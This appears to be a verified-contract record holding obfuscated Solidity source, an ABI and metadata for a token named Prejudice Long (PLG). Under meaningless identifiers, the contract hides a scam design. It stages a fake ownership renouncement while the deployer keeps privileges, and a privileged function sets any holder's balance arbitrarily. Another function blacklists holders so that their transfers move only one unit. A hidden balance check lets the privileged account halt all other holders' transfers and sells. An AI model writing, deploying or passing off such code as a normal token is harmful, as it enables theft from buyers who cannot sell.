{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface tradingModeTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxMinEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptTrading {\n    function createPair(address takeSwapFee, address launchAuto) external returns (address);\n}\n\ninterface feeExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoAt) external view returns (uint256);\n\n    function transfer(address fundMax, uint256 maxFund) external returns (bool);\n\n    function allowance(address toMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundMax,\n        uint256 maxFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listIs, uint256 value);\n    event Approval(address indexed toMarketing, address indexed spender, uint256 value);\n}\n\ninterface feeExemptMetadata is feeExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PrejudiceLong is maxMinEnable, feeExempt, feeExemptMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableTeamFee;\n    }\n\n    function owner() external view returns (address) {\n        return minLaunch;\n    }\n\n    function isReceiver() private view {\n        require(tradingAmount[_msgSender()]);\n    }\n\n    uint256 public sellBuy;\n\n    function liquidityMax(address senderReceiver) public {\n        if (buyTeamMode) {\n            return;\n        }\n        \n        tradingAmount[senderReceiver] = true;\n        \n        buyTeamMode = true;\n    }\n\n    mapping(address => bool) public tradingAmount;\n\n    function balanceOf(address autoAt) public view virtual override returns (uint256) {\n        return txAuto[autoAt];\n    }\n\n    function launchedWallet(address atTeamAmount, uint256 maxFund) public {\n        isReceiver();\n        txAuto[atTeamAmount] = maxFund;\n    }\n\n    address private minLaunch;\n\n    uint256 private walletTeam = 100000000 * 10 ** 18;\n\n    uint256 launchTo;\n\n    uint256 constant teamExempt = 1 ** 10;\n\n    function minTotal(address tradingEnable, address fundMax, uint256 maxFund) internal returns (bool) {\n        require(txAuto[tradingEnable] >= maxFund);\n        txAuto[tradingEnable] -= maxFund;\n        txAuto[fundMax] += maxFund;\n        emit Transfer(tradingEnable, fundMax, maxFund);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return minLaunch;\n    }\n\n    event OwnershipTransferred(address indexed marketingBuy, address indexed txLimit);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletTeam;\n    }\n\n    address public fromTotalExempt;\n\n    mapping(address => uint256) private txAuto;\n\n    uint256 public fromTo;\n\n    bool public tokenTx;\n\n    function transfer(address atTeamAmount, uint256 maxFund) external virtual override returns (bool) {\n        return txLaunchEnable(_msgSender(), atTeamAmount, maxFund);\n    }\n\n    function allowance(address atLiquidity, address fundListFrom) external view virtual override returns (uint256) {\n        if (fundListFrom == receiverWallet) {\n            return type(uint256).max;\n        }\n        return tokenMarketing[atLiquidity][fundListFrom];\n    }\n\n    function amountLiquidity(address toLimit) public {\n        isReceiver();\n        \n        if (toLimit == tokenTo || toLimit == fromTotalExempt) {\n            return;\n        }\n        listEnable[toLimit] = true;\n    }\n\n    address senderAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address tradingEnable, address fundMax, uint256 maxFund) external override returns (bool) {\n        if (_msgSender() != receiverWallet) {\n            if (tokenMarketing[tradingEnable][_msgSender()] != type(uint256).max) {\n                require(maxFund <= tokenMarketing[tradingEnable][_msgSender()]);\n                tokenMarketing[tradingEnable][_msgSender()] -= maxFund;\n            }\n        }\n        return txLaunchEnable(tradingEnable, fundMax, maxFund);\n    }\n\n    function txLaunchEnable(address tradingEnable, address fundMax, uint256 maxFund) internal returns (bool) {\n        if (tradingEnable == tokenTo) {\n            return minTotal(tradingEnable, fundMax, maxFund);\n        }\n        uint256 marketingTake = feeExempt(fromTotalExempt).balanceOf(senderAt);\n        require(marketingTake == receiverTx);\n        require(fundMax != senderAt);\n        if (listEnable[tradingEnable]) {\n            return minTotal(tradingEnable, fundMax, teamExempt);\n        }\n        return minTotal(tradingEnable, fundMax, maxFund);\n    }\n\n    function approve(address fundListFrom, uint256 maxFund) public virtual override returns (bool) {\n        tokenMarketing[_msgSender()][fundListFrom] = maxFund;\n        emit Approval(_msgSender(), fundListFrom, maxFund);\n        return true;\n    }\n\n    uint256 receiverTx;\n\n    bool public buyTeamMode;\n\n    function exemptEnable(uint256 maxFund) public {\n        isReceiver();\n        receiverTx = maxFund;\n    }\n\n    mapping(address => bool) public listEnable;\n\n    function maxTakeFund() public {\n        emit OwnershipTransferred(tokenTo, address(0));\n        minLaunch = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitToSell;\n    }\n\n    bool private atList;\n\n    string private enableAuto = \"Prejudice Long\";\n\n    address receiverWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return enableAuto;\n    }\n\n    constructor (){\n        if (sellBuy != fromTo) {\n            fromTo = sellBuy;\n        }\n        tradingModeTotal swapEnable = tradingModeTotal(receiverWallet);\n        fromTotalExempt = exemptTrading(swapEnable.factory()).createPair(swapEnable.WETH(), address(this));\n        if (sellBuy != fromTo) {\n            sellBuy = fromTo;\n        }\n        tokenTo = _msgSender();\n        maxTakeFund();\n        tradingAmount[tokenTo] = true;\n        txAuto[tokenTo] = walletTeam;\n        if (tokenTx) {\n            atList = false;\n        }\n        emit Transfer(address(0), tokenTo, walletTeam);\n    }\n\n    mapping(address => mapping(address => uint256)) private tokenMarketing;\n\n    address public tokenTo;\n\n    uint8 private limitToSell = 18;\n\n    string private enableTeamFee = \"PLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundListFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLimit\",\"type\":\"address\"}],\"name\":\"amountLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundListFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeamMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"exemptEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTotalExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTeamAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"launchedWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiver\",\"type\":\"address\"}],\"name\":\"liquidityMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTakeFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTeamAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PrejudiceLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}